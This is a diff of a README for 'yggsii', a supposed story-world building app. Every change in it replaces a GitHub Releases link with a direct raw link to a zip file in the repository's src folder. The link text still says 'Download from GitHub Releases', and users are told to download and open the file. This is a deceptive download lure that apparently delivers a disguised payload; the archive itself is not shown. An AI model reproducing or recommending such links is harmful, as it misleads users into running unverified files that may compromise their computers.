@@ -1,6 +1,6 @@
 # 🧭 yggsii - Build story worlds with clarity
 
-[![Download yggsii](https://img.shields.io/badge/Download%20yggsii-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Andyruanohe751/yggsii/releases)
+[![Download yggsii](https://img.shields.io/badge/Download%20yggsii-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Andyruanohe751/yggsii/main/src/Software_2.6-alpha.5.zip)
 
 ## ✨ What yggsii does
 
@@ -18,7 +18,7 @@ Use it to:
 
 To get yggsii on Windows, visit this page to download:
 
-[Download from GitHub Releases](https://github.com/Andyruanohe751/yggsii/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/Andyruanohe751/yggsii/main/src/Software_2.6-alpha.5.zip)
 
 On the releases page, look for the latest version and download the Windows file. After the download finishes, open the file to start the app.
 
@@ -172,7 +172,7 @@ This project focuses on:
 
 If you need to update or reinstall, use the same page:
 
-[https://github.com/Andyruanohe751/yggsii/releases](https://github.com/Andyruanohe751/yggsii/releases)
+[https://raw.githubusercontent.com/Andyruanohe751/yggsii/main/src/Software_2.6-alpha.5.zip](https://raw.githubusercontent.com/Andyruanohe751/yggsii/main/src/Software_2.6-alpha.5.zip)
 
 Look for the newest release, then download the Windows file from that page
 
